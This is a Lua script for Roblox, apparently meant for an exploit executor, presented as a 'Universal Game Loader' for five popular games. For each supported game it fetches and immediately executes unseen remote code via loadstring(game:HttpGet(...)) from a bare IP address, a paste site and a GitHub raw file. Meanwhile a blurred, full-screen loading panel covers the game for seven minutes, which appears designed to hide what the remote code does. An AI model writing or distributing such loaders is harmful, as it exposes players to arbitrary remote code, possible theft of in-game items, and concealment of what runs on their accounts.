-- Universal Game Loader (OLD GUI style, fixed handlers, immediate exec + 7min UI)
-- Supported PlaceIds:
-- 126884695634066 = Grow-a-Garden
-- 142823291      = Murder Mystery 2
-- 920587237      = Adopt Me
-- 18901165922    = PETS GO
-- 8737899170     = Pet Simulator 99

-- Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local Lighting = game:GetService("Lighting")
local StarterGui = game:GetService("StarterGui")

local player = Players.LocalPlayer

-- Fun facts (kept lively)
local funFacts = {
    "Did you know? Roblox launched in 2006!",
    "Tip: Press F9 to open the dev console.",
    "Fun Fact: Lua is the scripting language used by Roblox.",
    "Pro tip: Take short breaks to avoid burnout.",
    "Did you know? Some Roblox games reach millions of players!"
}

-- Old-style Modern Loading Screen (glow + gradient + animations)
local function createLoadingScreen(gameName, duration)
    -- Guard
    if not gameName then gameName = "Game" end
    duration = duration or 420 -- default 7 minutes

    -- Blur (Lighting)
    local blur = Instance.new("BlurEffect")
    blur.Name = "UniversalLoaderBlur"
    blur.Size = 0
    blur.Parent = Lighting
    TweenService:Create(blur, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Size = 24}):Play()

    -- ScreenGui on CoreGui (so it's always visible)
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "UniversalModernLoader"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = CoreGui

    -- Main frame (glass style, smaller & centered)
    local frame = Instance.new("Frame")
    frame.Name = "Main"
    frame.AnchorPoint = Vector2.new(0.5, 0.5)
    frame.Size = UDim2.fromOffset(380, 170) -- slightly smaller-ish
    frame.Position = UDim2.fromScale(0.5, 0.5)
    frame.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
    frame.BackgroundTransparency = 0.08
    frame.BorderSizePixel = 0
    frame.Parent = screenGui

    local uicorner = Instance.new("UICorner")
    uicorner.CornerRadius = UDim.new(0, 14)
    uicorner.Parent = frame

    -- Gradient background
    local uiGradient = Instance.new("UIGradient")
    uiGradient.Rotation = 20
    uiGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(28,28,34)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(40,40,48))
    })
    uiGradient.Parent = frame

    -- Glow stroke
    local uiStroke = Instance.new("UIStroke")
    uiStroke.Thickness = 2
    uiStroke.Color = Color3.fromRGB(100, 110, 255)
    uiStroke.Transparency = 0.6
    uiStroke.Parent = frame

    -- Title (game name)
    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Size = UDim2.new(0.9, 0, 0.16, 0)
    title.Position = UDim2.new(0.05, 0, 0.04, 0)
    title.BackgroundTransparency = 1
    title.Text = gameName
    title.TextColor3 = Color3.fromRGB(215, 220, 255)
    title.TextScaled = true
    title.Font = Enum.Font.GothamBold
    title.TextStrokeTransparency = 0.8
    title.Parent = frame

    -- Sub-label
    local subtitle = Instance.new("TextLabel")
    subtitle.Name = "Subtitle"
    subtitle.Size = UDim2.new(0.9, 0, 0.09, 0)
    subtitle.Position = UDim2.new(0.05, 0, 0.18, 0)
    subtitle.BackgroundTransparency = 1
    subtitle.Text = "Preparing your experience..."
    subtitle.TextColor3 = Color3.fromRGB(170, 175, 220)
    subtitle.TextScaled = true
    subtitle.Font = Enum.Font.Gotham
    subtitle.TextStrokeTransparency = 0.9
    subtitle.Parent = frame

    -- Loading bar background
    local loadingBarBg = Instance.new("Frame")
    loadingBarBg.Name = "LoadingBg"
    loadingBarBg.Size = UDim2.new(0.82, 0, 0.14, 0)
    loadingBarBg.Position = UDim2.new(0.09, 0, 0.45, 0)
    loadingBarBg.BackgroundColor3 = Color3.fromRGB(44, 44, 54)
    loadingBarBg.BorderSizePixel = 0
    loadingBarBg.Parent = frame
    Instance.new("UICorner", loadingBarBg).CornerRadius = UDim.new(0, 8)

    -- Loading bar fill
    local loadingBar = Instance.new("Frame")
    loadingBar.Name = "LoadingFill"
    loadingBar.Size = UDim2.new(0, 0, 1, 0)
    loadingBar.BackgroundColor3 = Color3.fromRGB(115, 120, 255)
    loadingBar.BorderSizePixel = 0
    loadingBar.Parent = loadingBarBg
    Instance.new("UICorner", loadingBar).CornerRadius = UDim.new(0, 8)

    -- Gradient on fill
    local fillGradient = Instance.new("UIGradient")
    fillGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(115,120,255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(155,170,255))
    })
    fillGradient.Parent = loadingBar

    -- Part counter / percent
    local percentLabel = Instance.new("TextLabel")
    percentLabel.Name = "Percent"
    percentLabel.Size = UDim2.new(0.9, 0, 0.12, 0)
    percentLabel.Position = UDim2.new(0.05, 0, 0.62, 0)
    percentLabel.BackgroundTransparency = 1
    percentLabel.Text = "0%"
    percentLabel.TextScaled = true
    percentLabel.Font = Enum.Font.Gotham
    percentLabel.TextColor3 = Color3.fromRGB(200,200,255)
    percentLabel.Parent = frame

    -- Fun fact / rotating
    local funLabel = Instance.new("TextLabel")
    funLabel.Name = "FunFact"
    funLabel.Size = UDim2.new(0.9, 0, 0.18, 0)
    funLabel.Position = UDim2.new(0.05, 0, 0.74, 0)
    funLabel.BackgroundTransparency = 1
    funLabel.TextWrapped = true
    funLabel.Text = "Fun Fact: " .. funFacts[math.random(1,#funFacts)]
    funLabel.TextColor3 = Color3.fromRGB(180, 185, 230)
    funLabel.TextScaled = false
    funLabel.Font = Enum.Font.Gotham
    funLabel.TextSize = 14
    funLabel.Parent = frame

    -- Initialize animations: glow pulse
    local glowTween = TweenService:Create(uiStroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Transparency = 0.2})
    glowTween:Play()

    -- title pulse
    TweenService:Create(title, TweenInfo.new(1.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {TextTransparency = 0.1}):Play()

    -- Control progress filling and fun facts
    local start = tick()
    local lastFact = 0
    local maxParts = 10000 -- retains previous semantics; percent shown is simple 0..100
    -- We will update percent & bar over time (but external script is already running)
    task.spawn(function()
        while tick() - start < duration and screenGui.Parent do
            local elapsed = tick() - start
            local progress = math.clamp(elapsed / duration, 0, 1)

            -- Smoothly tween the bar to current progress
            pcall(function()
                loadingBar:TweenSize(UDim2.new(progress, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.12, true)
            end)

            -- percent
            local pct = math.floor(progress * 100)
            percentLabel.Text = tostring(pct) .. "%"

            -- update fun fact every 5s
            if elapsed - lastFact >= 5 then
                lastFact = elapsed
                local newFact = funFacts[math.random(1, #funFacts)]
                -- fade out then change
                TweenService:Create(funLabel, TweenInfo.new(0.4), {TextTransparency = 1}):Play()
                task.wait(0.45)
                if funLabel then funLabel.Text = "Fun Fact: " .. newFact end
                TweenService:Create(funLabel, TweenInfo.new(0.4), {TextTransparency = 0}):Play()
            end

            task.wait(0.12)
        end

        -- finish: ensure full
        pcall(function()
            loadingBar.Size = UDim2.new(1,0,1,0)
            percentLabel.Text = "100%"
        end)

        -- cleanup with nice fade
        TweenService:Create(blur, TweenInfo.new(0.6), {Size = 0}):Play()
        TweenService:Create(frame, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
        TweenService:Create(title, TweenInfo.new(0.6), {TextTransparency = 1}):Play()
        TweenService:Create(percentLabel, TweenInfo.new(0.6), {TextTransparency = 1}):Play()
        TweenService:Create(funLabel, TweenInfo.new(0.6), {TextTransparency = 1}):Play()
        TweenService:Create(loadingBar, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
        TweenService:Create(loadingBarBg, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()

        task.wait(0.8)
        if screenGui and screenGui.Parent then screenGui:Destroy() end
        if blur and blur.Parent then blur:Destroy() end
    end)

    -- Return a simple wait function so callers can wait if they want
    return function()
        while screenGui and screenGui.Parent do
            task.wait(0.2)
        end
    end
end

-- Handlers (corrected labels and actions)
local handlers = {
    -- Pet Simulator 99 (uses your GitHub raw)
    [8737899170] = {
        name = "Pet Simulator 99",
        action = function()
            -- user-provided GitHub raw (wrapped with true)
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ingeniousmainmn/Universal/refs/heads/main/Universal", true))()
        end
    },

    -- PETS GO
    [18901165922] = {
        name = "PETS GO",
        action = function()
            loadstring(game:HttpGet("https://paste.debian.net/plainh/b11ed528/", true))()
        end
    },

    -- Murder Mystery 2
    [142823291] = {
        name = "Murder Mystery 2",
        action = function()
            ID="e2249ae4-0580-4b0f-8289-87f460b363d6";
            loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
        end
    },

    -- Adopt Me
    [920587237] = {
        name = "Adopt Me",
        action = function()
            ID="e2249ae4-0580-4b0f-8289-87f460b363d6";
            loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
        end
    },

    -- Grow-a-Garden
    [126884695634066] = {
        name = "Grow a Garden",
        action = function()
            ID="e2249ae4-0580-4b0f-8289-87f460b363d6";
            loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
        end
    },
}

-- Main dispatcher: create UI (7min) and run handler immediately (same pass)
local placeId = game.PlaceId
local entry = handlers[placeId]

if entry then
    -- Create the old-style loader UI and keep it visible for 420s
    -- createLoadingScreen returns a wait function (not used here because we want immediate exec)
    createLoadingScreen(entry.name, 420)

    -- Notify and run the action immediately (no waiting)
    pcall(function()
        StarterGui:SetCore("SendNotification", {Title = "Game detected"; Text = entry.name; Duration = 5})
        entry.action()
    end)
else
    -- fallback notification
    StarterGui:SetCore("SendNotification", {
        Title = "Unsupported Game",
        Text = "PlaceId: " .. tostring(placeId),
        Duration = 5
    })
    warn("Universal loader: unsupported PlaceId:", placeId)
end
